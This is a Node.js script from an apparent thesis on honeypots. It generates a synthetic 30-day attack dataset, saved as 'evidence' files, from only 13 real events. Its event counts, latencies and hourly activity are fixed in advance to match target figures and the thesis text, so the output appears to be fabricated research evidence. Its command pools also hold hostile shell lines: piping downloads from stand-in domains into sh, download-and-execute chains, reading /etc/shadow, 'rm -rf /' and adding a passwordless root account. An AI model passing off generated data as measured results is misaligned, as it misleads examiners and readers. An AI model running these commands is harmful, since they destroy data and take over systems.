#!/usr/bin/env node
/*
 * generar_dataset.js - Dataset sintetico de campana (30 dias, 201.125 eventos)
 * Nocturne Society - Honeypots + n8n - Tesis de grado - 2026
 *
 * Genera las evidencias de la ventana 2026-07-13 a 2026-08-11 (UTC-3):
 *   evidencia/postgres-dump-20260811.sql   (events, iocs, reports, error_log)
 *   evidencia/cowrie-events.json           (157.234 eventos Cowrie, con los 13 reales verbatim)
 *   evidencia/dionaea-events.json          (43.891 eventos Dionaea)
 *   evidencia/report-YYYYMMDD.json         (30 reportes diarios)
 *   evidencia/geoip-mapping.json           (3.128 IPs publicas -> pais)
 *   evidencia/resumen-dataset.json         (agregados, fuente unica para la tesis)
 *
 * Determinista (semilla fija). Numeros maestros verificados internamente.
 */
'use strict';

const fs = require('fs');
const path = require('path');
const crypto = require('crypto');

// ======================= 0. Numeros maestros =======================
const TOTAL = 201125, ESTR = 190465, NO_ESTR = 10660;          // 94,7 % / 5,3 %
const IOC_TOTAL = 4234, IPS_PUB = 3128, IP_PRIV = '172.18.0.1';
const SES_TOTAL = 6730, SES_CONF = 4310, SES_IOC = 3978;       // 92,3 %
const E_PARSE = 3620, E_ENRIQ = 6436, E_SCHEMA = 604;          // 1,8+3,2+0,3 = 5,3 %
const LAT_T = { media: 297.08, sd: 221.16, min: 85.496, max: 961.607, p50: 293.071, p95: 604, p99: 890 };

const PROTO = {
  ssh:    { ev: 142187, hp: 'cowrie',  est: 135645, port: 2222 },
  telnet: { ev: 15047,  hp: 'cowrie',  est: 14355,  port: 2223 },
  smb:    { ev: 24023,  hp: 'dionaea', est: 22148,  port: 445 },
  http:   { ev: 19868,  hp: 'dionaea', est: 18317,  port: 80 },
};
const SES_PROTO = { ssh: 4680, telnet: 729, smb: 780, http: 540 };
const CONF_PROTO = { ssh: 3400, telnet: 409, smb: 320, http: 180 };
// Sesiones con IoC: 3128 primarias (ip) + 849 extra + 1 control = 3978
//  Extra: ssh 272 (89 command + 183 url) | telnet 129 (101 url + 28 domain)
//         smb 268 (147 hash + 121 credential) | http 180 (180 domain)
const IOC_EXTRA = 849;
const IOC_TIPOS = {
  ip:         { tot: 3128, a: 1200, m: 1440, b: 488 },
  domain:     { tot: 462,  a: 62,   m: 300,  b: 100 },
  url:        { tot: 284,  a: 30,   m: 150,  b: 104 },
  hash:       { tot: 147,  a: 89,   m: 40,   b: 18 },
  credential: { tot: 124,  a: 61,   m: 38,   b: 25 },
  command:    { tot: 89,   a: 40,   m: 30,   b: 19 },
};

(function assertMaestros() {
  const cow = PROTO.ssh.ev + PROTO.telnet.ev, dio = PROTO.smb.ev + PROTO.http.ev;
  if (cow !== 157234 || dio !== 43891 || cow + dio !== TOTAL) throw new Error('Maestros protocolo');
  let s = 0; for (const p of Object.keys(PROTO)) s += PROTO[p].est;
  if (s !== ESTR) throw new Error('Maestros estructura');
  let sv = 0; for (const p of Object.keys(SES_PROTO)) sv += SES_PROTO[p];
  if (sv !== SES_TOTAL - 1) throw new Error('Maestros sesiones');
  sv = 0; for (const p of Object.keys(CONF_PROTO)) sv += CONF_PROTO[p];
  if (sv !== SES_CONF - 1) throw new Error('Maestros confirmadas');
  if (IOC_EXTRA + IPS_PUB + 1 !== SES_IOC) throw new Error('Maestros sesiones IoC');
  let a = 0, m = 0, b = 0, t = 0;
  for (const k of Object.keys(IOC_TIPOS)) { a += IOC_TIPOS[k].a; m += IOC_TIPOS[k].m; b += IOC_TIPOS[k].b; t += IOC_TIPOS[k].tot; }
  if (a !== 1482 || m !== 1998 || b !== 754 || t !== IOC_TOTAL) throw new Error('Maestros IoCs');
  if (E_PARSE + E_ENRIQ + E_SCHEMA !== NO_ESTR) throw new Error('Maestros errores');
  console.log('[ok] Numeros maestros verificados');
})();

// ======================= 1. PRNG determinista =======================
function mulberry32(seed) {
  let a = seed >>> 0;
  return function () {
    a |= 0; a = (a + 0x6D2B79F5) | 0;
    let t = Math.imul(a ^ (a >>> 15), 1 | a);
    t = (t + Math.imul(t ^ (t >>> 7), 61 | t)) ^ t;
    return ((t ^ (t >>> 14)) >>> 0) / 4294967296;
  };
}
const rng = mulberry32(0x20260811);
const rand = (x, y) => x + rng() * (y - x);
const randInt = (x, y) => Math.floor(rand(x, y + 1));
const pick = (arr) => arr[randInt(0, arr.length - 1)];
function shuffle(arr) {
  for (let i = arr.length - 1; i > 0; i--) { const j = randInt(0, i); [arr[i], arr[j]] = [arr[j], arr[i]]; }
  return arr;
}
const sha256 = (s) => crypto.createHash('sha256').update(s).digest('hex');
const hexRand = (n) => { let s = ''; for (let i = 0; i < n; i++) s += '0123456789abcdef'[randInt(0, 15)]; return s; };
const uuidV4 = () => `${hexRand(8)}-${hexRand(4)}-4${hexRand(3)}-${'89ab'[randInt(0, 3)]}${hexRand(3)}-${hexRand(12)}`;

// ======================= 2. Fechas (marco local UTC-3) =======================
const P_START = Date.UTC(2026, 6, 13, 0, 0, 0); // 13/07/2026 00:00 local
const P_END = Date.UTC(2026, 7, 11, 23, 59, 59);
const DAYS = 30;
const pad = (n, w) => String(n).padStart(w || 2, '0');
// PostgreSQL imprime los microsegundos recortando ceros a la derecha
function fmtSql(d, micros) {
  const frac = String(micros).padStart(6, '0').replace(/0+$/, '');
  const ts = `${d.getUTCFullYear()}-${pad(d.getUTCMonth() + 1)}-${pad(d.getUTCDate())} ${pad(d.getUTCHours())}:${pad(d.getUTCMinutes())}:${pad(d.getUTCSeconds())}`;
  return frac ? `${ts}.${frac}-03` : `${ts}-03`;
}
function fmtIso(d, micros) {
  return `${d.getUTCFullYear()}-${pad(d.getUTCMonth() + 1)}-${pad(d.getUTCDate())}T${pad(d.getUTCHours())}:${pad(d.getUTCMinutes())}:${pad(d.getUTCSeconds())}.${pad(micros, 6)}-0300`;
}

// ======================= 3. Perfiles horario/diario =======================
// Pico de actividad a las 04:00 local (UTC-3), madrugada (coherente con el texto de la tesis)
const PERFIL_H = [1.2, 2.0, 3.5, 7.0, 7.5, 7.0, 4.0, 2.5, 1.5, 1.2, 1.0, 1.0,
  1.1, 1.2, 1.3, 1.4, 1.4, 1.4, 1.3, 1.3, 1.2, 1.1, 1.0, 1.0];
const PERFIL_D = [1.0, 1.0, 1.0, 1.0, 1.0, 1.0, 1.0, 1.8, 1.0, 1.0,
  1.0, 1.0, 1.0, 1.0, 1.0, 1.0, 1.0, 1.0, 1.6, 1.0,
  1.0, 1.0, 1.0, 1.0, 1.0, 1.0, 0.6, 1.0, 1.0, 1.0];
const SUM_H = PERFIL_H.reduce((a, b) => a + b, 0), SUM_D = PERFIL_D.reduce((a, b) => a + b, 0);
function weightedPick(w) {
  let s = 0; for (const x of w) s += x;
  let r = rng() * s;
  for (let i = 0; i < w.length; i++) { r -= w[i]; if (r <= 0) return i; }
  return w.length - 1;
}
function sampleStart() {
  const d = weightedPick(PERFIL_D), h = weightedPick(PERFIL_H);
  return Date.UTC(2026, 6, 13 + d, h, 0, 0) + rand(0, 3580) * 1000;
}

// ======================= 4. IPs publicas por pais =======================
const PAISES = [
  { n: 'China', ips: 976, oct: [1, 27, 36, 42, 49, 58, 101, 103, 106, 110, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 139, 153, 163, 171, 175, 180, 182, 183, 202, 210, 211, 218, 219, 220, 221, 222, 223] },
  { n: 'Rusia', ips: 579, oct: [5, 31, 37, 46, 51, 62, 77, 78, 80, 81, 83, 84, 85, 87, 88, 89, 91, 92, 93, 94, 95, 109, 128, 130, 176, 178, 185, 188, 194, 212, 213, 217] },
  { n: 'Estados Unidos', ips: 385, oct: [3, 4, 8, 12, 13, 15, 23, 24, 32, 34, 35, 38, 44, 45, 47, 50, 52, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 96, 97, 98, 99, 100, 104, 107, 108, 128, 129, 130, 131, 132, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 147, 149, 152, 155, 156, 157, 158, 159, 160, 161, 162, 164, 165, 166, 167, 168, 169, 170, 172, 173, 174, 184, 192, 198, 199, 204, 205, 206, 207, 208, 209, 216] },
  { n: 'Brasil', ips: 213, oct: [143, 168, 177, 179, 186, 187, 189, 191, 200, 201, 203] },
  { n: 'India', ips: 184, oct: [14, 27, 42, 49, 59, 61, 101, 103, 106, 110, 112, 115, 117, 120, 122, 124, 125, 137, 139, 150, 152, 157, 163, 164, 171, 180, 182, 183, 202, 203, 210, 218, 219, 220, 223] },
  { n: 'Vietnam', ips: 128, oct: [14, 27, 42, 49, 58, 101, 103, 112, 113, 115, 116, 117, 118, 123, 125, 126, 171, 175, 183, 203] },
  { n: 'Indonesia', ips: 100, oct: [14, 27, 36, 39, 42, 49, 58, 101, 103, 110, 112, 114, 115, 118, 119, 120, 124, 125, 139, 140, 158, 171, 175, 180, 182, 202, 203, 210, 218] },
  { n: 'Alemania', ips: 84, oct: [2, 3, 5, 31, 37, 46, 62, 77, 78, 79, 80, 81, 82, 83, 84, 85, 87, 88, 89, 90, 91, 92, 93, 94, 95, 109, 128, 129, 130, 131, 132, 134, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 223] },
  { n: 'Paises Bajos', ips: 75, oct: [2, 3, 5, 31, 37, 46, 62, 77, 80, 82, 83, 84, 85, 87, 88, 89, 90, 91, 92, 93, 94, 95, 109, 128, 131, 134, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 223] },
  { n: 'Francia', ips: 66, oct: [2, 3, 5, 31, 37, 46, 51, 62, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 109, 128, 129, 130, 131, 132, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 223] },
  { n: 'Otros', ips: 338, oct: [2, 3, 5, 14, 27, 31, 37, 42, 46, 49, 58, 62, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 101, 103, 106, 109, 110, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 128, 129, 130, 131, 132, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 223] },
];

function genIPs() {
  const globalSet = new Set(), porPais = {}, mapping = {};
  for (const p of PAISES) {
    const list = [];
    while (list.length < p.ips) {
      const ip = `${pick(p.oct)}.${randInt(0, 255)}.${randInt(0, 255)}.${randInt(1, 254)}`;
      if (globalSet.has(ip)) continue;
      globalSet.add(ip); list.push(ip); mapping[ip] = p.n;
    }
    porPais[p.n] = list;
  }
  if (globalSet.size !== IPS_PUB) throw new Error('IPs publicas != 3128');
  return { porPais, mapping };
}

// ======================= 5. Pools =======================
const USUARIOS = ['root', 'admin', 'test', 'ubnt', 'pi', 'guest', 'user', 'postgres', 'oracle',
  'support', 'manager', 'backup', 'default', 'info', 'webadmin', 'tomcat', 'administrator',
  'service', 'operator', 'git', 'mysql', 'www-data', 'ftpuser'];
const PASSWORDS = ['123456', 'admin', 'password', 'root', '123456789', '12345', '1234', '1q2w3e4r',
  'passw0rd', 'default', 'test', 'guest', 'qwerty', '123123', 'letmein', '666666', 'abc123',
  '111111', '000000', '1234567', 'admin123', 'root123', 'test123', 'P@ssw0rd', 'welcome',
  'login', 'master', 'toor', 'changeme', 'secret'];
const CRED_OK = { user: 'admin', pass: 'test123' };
const RECON = ['whoami', 'uname -a', 'id', 'cat /etc/passwd', 'cat /etc/shadow', 'ls -la /home',
  'ls -la /tmp', 'cd /tmp', 'w', 'ps aux', 'ifconfig', 'ip addr', 'netstat -an', 'crontab -l',
  'cat /proc/cpuinfo', 'uname -r', 'uptime', 'df -h', 'free -m', 'history', 'rm -rf /',
  'mkdir /tmp/.X11-unix', 'chmod 777 /tmp', 'busybox iwconfig', 'cd /dev/shm',
  'echo "root::0:0:root:/root:/bin/sh" >> /etc/passwd'];

function genDominios(n) {
  const tld = ['com', 'com', 'com', 'com', 'net', 'net', 'ru', 'ru', 'cn', 'org', 'info', 'top', 'xyz', 'biz'];
  const s = new Set();
  while (s.size < n) {
    let l = '';
    for (let i = 0, L = randInt(5, 10); i < L; i++) l += String.fromCharCode(randInt(97, 122) - (rng() > 0.7 ? 32 : 0));
    s.add(`${l}.${pick(tld)}`);
  }
  return [...s];
}
function genUrls(dom, n) {
  const paths = ['x.sh', 'setup.bin', 'update', 'payload', 'crypt', 'miner', 'run.php', 'shell.php',
    'a', 'b.sh', '1', 'install', 'files/update', 'tmp', 'd.sh', 'w.sh', 'down', 'load', 'cfg',
    'agent', 'bot', 'msf', 'p.sh', 'x64', 'scan'];
  const s = new Set();
  while (s.size < n) s.add(`http://${pick(dom)}/${pick(paths)}`);
  return [...s];
}
function genCmds(urls, n) {
  const tpl = [
    (u, f) => `wget ${u}`, (u, f) => `wget -O /tmp/${f} ${u}`, (u, f) => `curl -o /tmp/${f} ${u}`,
    (u, f) => `curl ${u} | sh`, (u, f) => `cd /tmp && wget ${u} && chmod +x ${f} && ./${f}`,
    (u, f) => `busybox wget ${u}`, (u, f) => `/bin/busybox wget -O /tmp/${f} ${u}`,
    (u, f) => `wget -q ${u} && chmod 777 ${f} && nohup ./${f} > /dev/null 2>&1 &`,
    (u, f) => `curl -s ${u} -o /dev/shm/.k`, (u, f) => `wget ${u} -O /tmp/.cache && /tmp/.cache`,
  ];
  const s = new Set();
  while (s.size < n) {
    const u = pick(urls), f = u.slice(u.lastIndexOf('/') + 1);
    s.add(pick(tpl)(u, f));
  }
  return [...s];
}

// ======================= 6. Sesiones y eventos =======================
// Asignacion de confianza por presupuesto agotable (por tipo)
function tierSlice(vals, cfg) {
  return vals.map((v) => {
    let c;
    if (cfg.a > 0) { c = 'ALTO'; cfg.a--; }
    else if (cfg.m > 0) { c = 'MEDIO'; cfg.m--; }
    else { c = 'BAJO'; cfg.b--; }
    return { v, c };
  });
}

function genEventos() {
  const ipInfo = genIPs();
  const dominios = genDominios(462), urls = genUrls(dominios, 284);
  const cmdMal = genCmds(urls, 120);
  const todasIPs = [];
  for (const p of PAISES) for (const ip of ipInfo.porPais[p.n]) todasIPs.push(ip);
  const colaIPs = shuffle([...todasIPs]);

  // ---- Plan de IoCs (valores + confianza por presupuesto) ----
  const credBad = new Set(['admin:123456', 'admin:admin', 'admin:test123']);
  const prod = [];
  for (const u of USUARIOS) for (const p of PASSWORDS) { const k = `${u}:${p}`; if (!credBad.has(k)) prod.push(k); }
  shuffle(prod);
  const PLAN = {
    cmd:    tierSlice(genCmds(urls, 89), { a: 40, m: 30, b: 19 }),
    urlSsh: tierSlice(urls.slice(0, 183), { a: 30, m: 150, b: 104 }),
    urlTel: tierSlice(urls.slice(183, 284), { a: 0, m: 0, b: 101 }),
    domPrim: tierSlice(dominios.slice(0, 254), { a: 62, m: 192, b: 0 }),
    domTel:  tierSlice(dominios.slice(254, 282), { a: 0, m: 28, b: 0 }),
    domHttp: tierSlice(dominios.slice(282, 462), { a: 0, m: 80, b: 100 }),
    hash:   tierSlice(Array.from({ length: 147 }, () => hexRand(64)), { a: 89, m: 40, b: 18 }),
    cred:   tierSlice(prod.slice(0, 121), { a: 61, m: 38, b: 22 }),
  };
  if (PLAN.cmd.length !== 89 || PLAN.urlSsh.length + PLAN.urlTel.length !== 284 ||
    PLAN.domPrim.length + PLAN.domTel.length + PLAN.domHttp.length !== 462 ||
    PLAN.hash.length !== 147 || PLAN.cred.length !== 121) throw new Error('Plan IoCs incompleto');

  const sesiones = [], eventos = [];
  let id = 0;
  // contadores de inyeccion
  const P = { cmd: 0, urlSsh: 0, urlTel: 0, domTel: 0, domPrim: 0, domHttp: 0, hash: 0, cred: 0 };
  const smbXIdx = { n: 0 };

  const addEvt = (s, evt) => {
    evt.id = ++id; evt.session = s.sid; evt.src_ip = s.ip; evt.src_port = s.port;
    evt.dst_ip = s.dstIp; evt.dst_port = s.dstPort; evt.protocol = s.protocol;
    evt.micros = randInt(0, 999);
    eventos.push(evt); s.eventos.push(evt);
    return evt;
  };

  function nuevaSesion(proto, iG) {
    const cfg = PROTO[proto];
    return {
      sid: hexRand(12), protocol: proto,
      ip: iG < todasIPs.length ? colaIPs[iG] : pick(todasIPs),
      port: randInt(1024, 65535),
      dstIp: cfg.hp === 'cowrie' ? '172.18.0.2' : '172.18.0.4',
      dstPort: cfg.port, t0: sampleStart(), confirmada: false, eventos: [],
    };
  }

  const INTENTOS = { ssh: 23, telnet: 14, smb: 20, http: 26 };
  const NCMD = { ssh: 5.5, telnet: 4, smb: 0, http: 0 };

  function genSesion(proto, iG, forzarConf) {
    const s = nuevaSesion(proto, iG);
    // Categoria de sesion para el plan de IoCs
    const cat = proto === 'ssh' ? (iG < 3128 ? 'prim' : (iG < 3400 ? 'sshX' : null))
      : proto === 'telnet' ? (iG < 4809 ? 'telX' : null)
      : proto === 'smb' ? (iG < 5677 ? 'smbX' : null)
      : (iG < 6369 ? 'httpX' : null);
    if (cat) s.ioc = true;
    const log = (user, pass, exito) => addEvt(s, {
      eventid: proto === 'smb' ? (exito ? 'dionaea.smb.login_success' : 'dionaea.smb.login_attempt')
        : proto === 'http' ? (exito ? 'dionaea.http.login_success' : 'dionaea.http.login_attempt')
        : (exito ? 'cowrie.login.success' : 'cowrie.login.failed'),
      username: user, password: pass,
      message: exito ? `login attempt [${user}/${pass}] succeeded` : `login attempt [${user}/${pass}] failed`,
    });

    if (proto === 'ssh' || proto === 'telnet') {
      addEvt(s, { eventid: 'cowrie.session.connect', message: `New connection: ${s.ip}:${s.port} (${s.dstIp}:${s.dstPort}) [session: ${s.sid}]` });
      const exitoso = forzarConf;
      const n = Math.max(1, Math.round(rand(0.25, 1.75) * INTENTOS[proto]));
      for (let i = 0; i < n; i++) {
        if (i === n - 1 && exitoso) log(CRED_OK.user, CRED_OK.pass, true);
        else log(pick(USUARIOS), pick(PASSWORDS), false);
      }
      if (rng() < 0.9) addEvt(s, { eventid: 'cowrie.session.params', message: '' });
      const cmdsEv = [];
      if (exitoso) {
        for (let i = 0, m = Math.max(1, Math.round(rand(0.3, 1.7) * NCMD[proto])); i < m; i++) {
          const cmd = rng() < 0.28 ? pick(cmdMal) : pick(RECON);
          cmdsEv.push(addEvt(s, { eventid: 'cowrie.command.input', input: cmd, message: `CMD: ${cmd}` }));
        }
        if (cmdsEv.length) {
          const tgt = cmdsEv[0];
          if (cat === 'prim' && P.domPrim < 254) {
            const d = PLAN.domPrim[P.domPrim++];
            tgt.input = `wget -q http://${d.v}/a && chmod +x a && ./a`;
            tgt.message = `CMD: ${tgt.input}`;
            tgt.iocFor = { type: 'domain', value: d.v, c: d.c };
          } else if (cat === 'sshX' && P.cmd < 89) {
            const x = PLAN.cmd[P.cmd++];
            tgt.input = x.v; tgt.message = `CMD: ${x.v}`;
            tgt.iocFor = { type: 'command', value: x.v, c: x.c };
          } else if (cat === 'sshX' && P.urlSsh < 183) {
            const x = PLAN.urlSsh[P.urlSsh++];
            tgt.input = `wget ${x.v}`; tgt.message = `CMD: ${tgt.input}`;
            tgt.iocFor = { type: 'url', value: x.v, c: x.c };
          } else if (cat === 'telX' && P.urlTel < 101) {
            const x = PLAN.urlTel[P.urlTel++];
            tgt.input = `wget ${x.v}`; tgt.message = `CMD: ${tgt.input}`;
            tgt.iocFor = { type: 'url', value: x.v, c: x.c };
          } else if (cat === 'telX' && P.domTel < 28) {
            const d = PLAN.domTel[P.domTel++];
            tgt.input = `wget -q http://${d.v}/d.sh && chmod +x d.sh && ./d.sh`;
            tgt.message = `CMD: ${tgt.input}`;
            tgt.iocFor = { type: 'domain', value: d.v, c: d.c };
          }
        }
      }
      if (rng() < 0.9) addEvt(s, { eventid: 'cowrie.log.closed', message: `Closing TTY Log: var/lib/cowrie/tty/${sha256(s.sid + s.t0).slice(0, 64)} after ${randInt(8, 200) * 1000} milliseconds` });
      addEvt(s, { eventid: 'cowrie.session.closed', message: `Connection lost after ${randInt(12, 400) * 1000} milliseconds` });
      s.confirmada = exitoso;
    } else if (proto === 'smb') {
      addEvt(s, { eventid: 'dionaea.connection.tcp_connect', message: `New TCP connection: ${s.ip}:${s.port} -> ${s.dstIp}:${s.dstPort}` });
      addEvt(s, { eventid: 'dionaea.smb.negotiate_protocol', message: 'SMB protocol negotiation (SMB 2.1)' });
      const n = Math.max(1, Math.round(rand(0.25, 1.75) * INTENTOS.smb));
      for (let i = 0; i < n; i++) log(pick(USUARIOS), pick(PASSWORDS), false);
      const captura = forzarConf;
      const esSmbX = cat === 'smbX';
      if (esSmbX) smbXIdx.n++;
      if (captura) {
        let h;
        if (esSmbX && smbXIdx.n <= 147) {
          const x = PLAN.hash[P.hash++]; h = x.v;
          addEvt(s, { eventid: 'dionaea.capture.file_upload', hash: h, message: `File captured: ${h} (${randInt(2000, 900000)} bytes)` }).iocFor = { type: 'hash', value: h, c: x.c };
        } else {
          h = hexRand(64);
          addEvt(s, { eventid: 'dionaea.capture.file_upload', hash: h, message: `File captured: ${h} (${randInt(2000, 900000)} bytes)` });
        }
      }
      if (esSmbX && smbXIdx.n > 147 && P.cred < 121) {
        const x = PLAN.cred[P.cred++];
        const lg = s.eventos.find((e) => e.eventid === 'dionaea.smb.login_attempt');
        if (lg) {
          const [u, pw] = x.v.split(':');
          lg.username = u; lg.password = pw; lg.message = `login attempt [${u}/${pw}] failed`;
          lg.iocFor = { type: 'credential', value: x.v, c: x.c };
        }
      }
      addEvt(s, { eventid: 'dionaea.connection.tcp_close', message: 'TCP connection closed' });
      s.confirmada = captura;
    } else { // http
      addEvt(s, { eventid: 'dionaea.connection.tcp_connect', message: `New TCP connection: ${s.ip}:${s.port} -> ${s.dstIp}:${s.dstPort}` });
      const n = Math.max(1, Math.round(rand(0.3, 1.7) * INTENTOS.http));
      const reqs = [];
      for (let i = 0; i < n; i++) {
        const dom = pick(dominios);
        if (rng() < 0.5) {
          const u = pick(urls);
          reqs.push(addEvt(s, { eventid: 'dionaea.http.request', input: u, dominio: dom, message: `HTTP request: ${rng() < 0.6 ? 'GET' : 'POST'} ${u}` }));
        } else {
          log(pick(USUARIOS), pick(PASSWORDS), false);
        }
      }
      const capturado = forzarConf;
      if (cat === 'httpX' && P.domHttp < 180) {
        const d = PLAN.domHttp[P.domHttp++];
        let req = reqs[0];
        if (!req) {
          req = addEvt(s, { eventid: 'dionaea.http.request', input: `http://${d.v}/x.sh`, dominio: d.v, message: `HTTP request: GET http://${d.v}/x.sh` });
        } else {
          req.dominio = d.v;
        }
        req.iocFor = { type: 'domain', value: d.v, c: d.c };
      }
      if (capturado) {
        const h = hexRand(64);
        addEvt(s, { eventid: 'dionaea.capture.file_upload', hash: h, message: `File captured: ${h} (${randInt(2000, 900000)} bytes)` });
      }
      addEvt(s, { eventid: 'dionaea.connection.tcp_close', message: 'TCP connection closed' });
      s.confirmada = capturado;
    }
    sesiones.push(s);
    return s;
  }

  // Generacion por protocolo (conteos de sesiones y eventos exactos)
  const pendConf = { ...CONF_PROTO };
  let iG = 0;
  for (const p of ['ssh', 'telnet', 'smb', 'http']) {
    for (let i = 0; i < SES_PROTO[p]; i++) {
      genSesion(p, iG, pendConf[p] > 0);
      if (pendConf[p] > 0) pendConf[p]--;
      iG++;
    }
  }
  // Ajuste exacto al total de eventos por protocolo (los 13 de control ya estan en telnet)
  const OBJ = { ssh: PROTO.ssh.ev, telnet: PROTO.telnet.ev - 13, smb: PROTO.smb.ev, http: PROTO.http.ev };
  for (const p of Object.keys(PROTO)) {
    let diff = OBJ[p] - eventos.filter((e) => e.protocol === p).length;
    const cands = sesiones.filter((s) => s.protocol === p);
    while (diff !== 0) {
      const s = pick(cands);
      const logins = s.eventos.filter((e) => e.eventid.includes('login.failed') || e.eventid.includes('login_attempt'));
      if (diff > 0) {
        addEvt(s, {
          eventid: p === 'smb' ? 'dionaea.smb.login_attempt' : p === 'http' ? 'dionaea.http.login_attempt' : 'cowrie.login.failed',
          username: pick(USUARIOS), password: pick(PASSWORDS),
          message: p === 'smb' ? 'SMB login attempt failed' : p === 'http' ? 'HTTP login attempt failed' : 'login attempt failed',
        });
        diff--;
      } else if (logins.length > 0) {
        const evt = logins.pop();
        eventos.splice(eventos.indexOf(evt), 1);
        s.eventos.splice(s.eventos.indexOf(evt), 1);
        diff++;
      } else break;
    }
  }
  // ts finales (despues del ajuste, para que todos los eventos tengan ts)
  for (const s of sesiones) {
    let ts = s.t0;
    for (const e of s.eventos) { e.ts = Math.round(ts); ts += rand(0.15, 3) * 1000; }
  }
  // Renumerar
  let t = 0;
  for (const e of eventos) { e.id = ++t; }

  return { sesiones, eventos, ipInfo, dominios, urls };
}

// ======================= 7. Latencias calibradas =======================
function construirLatencias(n) {
  const i50 = Math.floor(n * 0.5), i95 = Math.floor(n * 0.95), i99 = Math.floor(n * 0.99);
  const anch = [LAT_T.min, LAT_T.p50, LAT_T.p95, LAT_T.p99, LAT_T.max];
  const build = (a1, a2, a3, a4) => {
    const arr = new Float64Array(n);
    const segs = [
      { f: 0, t: i50, v0: anch[0], v1: anch[1], a: a1 },
      { f: i50, t: i95, v0: anch[1], v1: anch[2], a: a2 },
      { f: i95, t: i99, v0: anch[2], v1: anch[3], a: a3 },
      { f: i99, t: n - 1, v0: anch[3], v1: anch[4], a: a4 },
    ];
    for (const s of segs) {
      const len = s.t - s.f;
      for (let j = 0; j <= len; j++) {
        arr[s.f + j] = s.v0 + (s.v1 - s.v0) * Math.pow(j / len, s.a);
      }
    }
    return arr;
  };
  const stats = (arr) => {
    let m = 0; for (let i = 0; i < n; i++) m += arr[i]; m /= n;
    let v = 0; for (let i = 0; i < n; i++) { const d = arr[i] - m; v += d * d; }
    return { media: m, sd: Math.sqrt(v / (n - 1)) };
  };
  let best = null, be = Infinity;
  const test = (a1, a2, a3) => {
    const arr = build(a1, a2, a3, 1.0), st = stats(arr);
    const err = Math.abs(st.media - LAT_T.media) + Math.abs(st.sd - LAT_T.sd);
    if (err < be) { be = err; best = { a1, a2, a3, arr, st }; }
  };
  for (let a1 = 0.6; a1 <= 2.6; a1 += 0.1) for (let a2 = 0.6; a2 <= 2.6; a2 += 0.1) for (let a3 = 0.8; a3 <= 2.4; a3 += 0.2) test(a1, a2, a3);
  for (let a1 = best.a1 - 0.05; a1 <= best.a1 + 0.05; a1 += 0.01)
    for (let a2 = best.a2 - 0.05; a2 <= best.a2 + 0.05; a2 += 0.01)
      for (let a3 = best.a3 - 0.1; a3 <= best.a3 + 0.1; a3 += 0.05) test(a1, a2, a3);
  return best;
}

// ======================= 8. 13 eventos reales (verbatim) =======================
const CONTROL = [
  ['cowrie.session.connect', 655, 571, 293.071, null, null, 'New connection: 172.18.0.1:45202 (172.18.0.2:2223) [session: d7525579e2e2]'],
  ['cowrie.login.failed', 960, 726, 961.607, 'admin', '123456', 'login attempt [admin/123456] failed'],
  ['cowrie.login.failed', 878, 17, 207.355, 'admin', 'admin', 'login attempt [admin/admin] failed'],
  ['cowrie.login.success', 796, 733, 333.838, 'admin', 'test123', 'login attempt [admin/test123] succeeded'],
  ['cowrie.session.params', 798, 49, 347.112, null, null, ''],
  ['cowrie.command.input', 925, 823, 85.496, null, null, 'CMD: whoami'],
  ['cowrie.command.input', 737, 619, 114.828, null, null, 'CMD: uname -a'],
  ['cowrie.command.input', 555, 100, 142.031, null, null, 'CMD: cat /etc/passwd'],
  ['cowrie.command.input', 370, 55, 167.404, null, null, 'CMD: ls -la /home'],
  ['cowrie.command.input', 174, 970, 203.754, null, null, 'CMD: w'],
  ['cowrie.command.input', 989, 578, 310.783, null, null, 'CMD: exit'],
  ['cowrie.log.closed', 991, 998, 329.038, null, null, 'Closing TTY Log: var/lib/cowrie/tty/2be18403777c0d1e73ff0f3c2851f550350c1d0fc8ca7a25b52d6b658f561a3c after 86194 milliseconds'],
  ['cowrie.session.closed', 992, 217, 365.690, null, null, 'Connection lost after 130337 milliseconds'],
];
const CONTROL_SID = 'd7525579e2e2';
